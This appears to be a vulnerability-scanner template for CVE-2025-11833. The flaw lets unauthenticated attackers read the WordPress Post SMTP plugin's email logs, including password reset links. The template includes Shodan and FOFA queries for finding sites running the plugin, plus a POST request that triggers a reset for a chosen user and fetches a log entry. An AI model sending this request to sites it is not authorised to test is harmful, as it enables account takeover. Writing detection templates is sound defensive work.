id: CVE-2025-11833

info:
  name: Post SMTP <= 3.6.0 - Missing Authorization to Account Takeover via Unauthenticated Email Log Disclosure
  author: Kazgangap
  severity: critical
  description: | 
    The Post SMTP Complete SMTP Solution with Logs, Alerts, Backup SMTP & Mobile App plugin for WordPress is vulnerable to unauthorized access of data due to a missing capability check on the __construct function in all versions up to, and including, 3.6.0. This makes it possible for unauthenticated attackers to read arbitrary logged emails sent through the Post SMTP plugin, including password reset emails containing password reset links, which can lead to account takeover.
  reference:
    - https://github.com/Kazgangap/cve-poc-garage/blob/main/2025/CVE-2025-11833.md
    - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/post-smtp/post-smtp-complete-smtp-solution-with-logs-alerts-backup-smtp-mobile-app-360-missing-authorization-to-account-takeover-via-unauthenticated-email-log-disclosure
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2025-11833
    cwe-id: CWE-862
    cpe: cpe:2.3:a:wpexperts:post_smtp_mailer:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: wpexperts
    product: post_smtp_mailer
    framework: wordpress
    shodan-query: http.html:/wp-content/plugins/post-smtp
    fofa-query: body=/wp-content/plugins/post-smtp
  tags: cve,cve2025,wp-plugin,kev

variables:
  valid_user: "{{valid_user}}"
  view_log_id: "{{view_log_id}}" 


http:
  - method: POST
    path:
      - "{{BaseURL}}/wordpress/wp-login.php?action=lostpassword&page=postman_email_log&view=log&log_id={{view_log_id}}"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "user_login={{valid_user}}&redirect_to=&wp-submit=Get+New+Password"
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(content_type, "text/html")'
          - 'len(body) > 0'
          - 'contains(body,{{BaseURL}})'
